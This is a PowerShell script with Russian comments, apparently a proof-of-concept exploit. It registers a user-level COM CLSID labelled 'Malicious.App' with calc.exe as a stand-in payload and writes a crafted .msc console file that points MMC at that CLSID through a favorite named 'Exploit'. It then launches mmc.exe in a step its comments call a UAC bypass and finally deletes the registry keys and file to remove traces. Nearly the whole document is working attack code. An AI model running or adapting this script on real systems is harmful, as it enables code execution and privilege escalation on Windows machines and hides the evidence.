
# Генерация CLSID
$clsid = [Guid]::NewGuid().ToString().ToUpper()
$regPath = "HKCU:\Software\Classes\CLSID\{$clsid}"

# 1. Корректная структура реестра для EXE-файлов
New-Item -Path "$regPath\LocalServer32" -Force | Out-Null
Set-ItemProperty -Path "$regPath\LocalServer32" -Name "(Default)" -Value "`"$env:SystemRoot\System32\calc.exe`"" -Force

# 2. Дополнительные параметры для регистрации COM-объекта
Set-ItemProperty -Path $regPath -Name "AppID" -Value "{$clsid}" -Force
New-Item -Path "$regPath\ProgID" -Force | Out-Null
Set-ItemProperty -Path "$regPath\ProgID" -Name "(Default)" -Value "Malicious.App" -Force

# 3. Генерация .msc-файла с BOM и правильным форматированием
$mscContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<ConsoleFile ConsoleVersion="2.0">
  <Console>
    <Snapins>
      <Snapin>
        <Name>LinkToCLSID</Name>
        <ClassId>{71F96464-78F3-11D0-A94C-00C04FD9207E}</ClassId>
      </Snapin>
    </Snapins>
    <Favorites>
      <Favorite Name="Exploit">
        <Target>
          <SnapinCLSID>{71F96464-78F3-11D0-A94C-00C04FD9207E}</SnapinCLSID>
          <URL TargetName="Frame">clsid:$clsid</URL>
        </Target>
      </Favorite>
    </Favorites>
  </Console>
</ConsoleFile>
"@

$mscPath = "$env:USERPROFILE\Documents\test_console.msc"
$mscContent | Out-File -FilePath $mscPath -Encoding Unicode

# 4. Обновление реестра и ожидание
Start-Sleep -Seconds 3

# 5. Запуск с обходом UAC и проверкой архитектуры
$mmcArgs = @(
    "/64", 
    "`"$mscPath`"",
    "/a",
    "/nosplash"
) -join " "

Start-Process -FilePath "mmc.exe" -ArgumentList $mmcArgs -WindowStyle Maximized

# 6. Расширенная очистка
Start-Sleep -Seconds 15
Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $mscPath -Force -ErrorAction SilentlyContinue
[System.GC]::Collect()